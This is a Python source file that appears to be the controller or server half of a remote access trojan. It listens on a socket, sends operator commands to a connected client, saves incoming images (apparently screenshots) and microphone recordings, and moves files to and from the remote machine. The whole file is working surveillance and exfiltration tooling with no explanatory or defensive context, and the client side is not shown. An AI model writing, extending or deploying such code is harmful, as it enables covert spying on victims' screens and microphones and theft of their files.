import os
import socket
import sys
import time
import string
import random
import colorama

colorama.init()
def id_gen(size=7, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for c in range(size))

host = ""
port = 1234 #CHANGE THIS

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(1)
print("Server is listening...")
conn, address = s.accept()
print("\nClient successfully connected with",address)

while True:
    data = conn.recv(2048)
    datad = data.decode("utf-8")
    print(datad, end = "")

    if datad.strip() == "[*] Sending...":
        file = "image-"+id_gen()+".png"
        f = open(file, "wb")
        i = conn.recv(1024)
        while not ("complete") in str(i):
            f.write(i)
            i = conn.recv(1024)
        f.close()
        print("\n[+] Image saved\n[*] Press ENTER to continue", end = "")

    if datad.strip() == "[+] Audio saved":
        file = "audio-"+id_gen()+".wav"
        f = open(file, "wb")
        i = conn.recv(1024)
        while not ("complete") in str(i):
            f.write(i)
            i = conn.recv(1024)
        f.close()
        print("\n[*] Press ENTER to continue", end = "")

    clientsend = input("")
    conn.send(clientsend.encode())
    if clientsend.strip() == "exit":
        conn.close()
        sys.exit()
    if clientsend.strip() == str(""):
        conn.send(" ".encode())
    if clientsend.strip() == "rec_mic":
        sound = input("[*] Enter the duration in seconds: ")
        conn.send(sound.encode())
    if clientsend.strip() == "download":
        filename = input('[*] Enter the name of file with extension: ')
        conn.send(filename.encode()) 
        d = conn.recv(1024)
        dd = d.decode('utf-8')
        if dd[:6] == 'EXISTS':
            filesize = int(d[6:])
            conn.send(str.encode('OK'))
            print("[*] Downloading...")
            f = open('new-' + filename, 'wb')
            d = conn.recv(1024)
            totalRecv = len(d)
            f.write(d)
            while totalRecv < filesize:
                d = conn.recv(1024)
                totalRecv += len(d)
                f.write(d)
            f.close()
            print("[+] Download complete")
        else:
            print("[x] File not found\n[*] Press ENTER to continue", end = "")
            input("")

    if clientsend.strip() == "upload":
        filename = input('[*] Enter the name of file with extension: ')
        conn.send(filename.encode())
        if os.path.isfile(filename):
            conn.send(str.encode('EXISTS' + str(os.path.getsize(filename))))
            userResp = conn.recv(1024)
            userRespd = userResp.decode('utf-8')
            print("[*] Uploading...")
            if userRespd[:2] == 'OK':
                f =  open(filename, 'rb')
                i = f.read(1024)
                time.sleep(1)
                while (i):
                    conn.send(i)
                    i = f.read(1024)
                f.close()
            print("[+] Download complete")
        else:
            print("[x] File not found")
            conn.send("continue".encode())
colorama.deinit()
    
